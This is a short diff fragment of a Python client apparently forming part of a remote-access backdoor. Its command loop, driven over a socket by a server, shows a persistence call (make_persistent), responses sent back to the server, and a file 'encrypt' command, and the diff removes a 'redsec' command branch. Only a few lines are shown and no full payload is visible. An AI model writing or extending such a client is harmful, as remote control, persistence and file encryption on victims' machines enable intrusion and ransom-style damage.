@@ -142,11 +142,7 @@ def connect_to_server(server_ip, server_port):
                 make_persistent()
                 client_socket.send(response.encode('utf-8'))
                 continue
-            
-            elif command.lower() == 'redsec':
-                redsec()
-                continue
-            
+                
             elif command.startswith("encrypt "):
                 try:
                     _, file_path, password = command.split(' ')
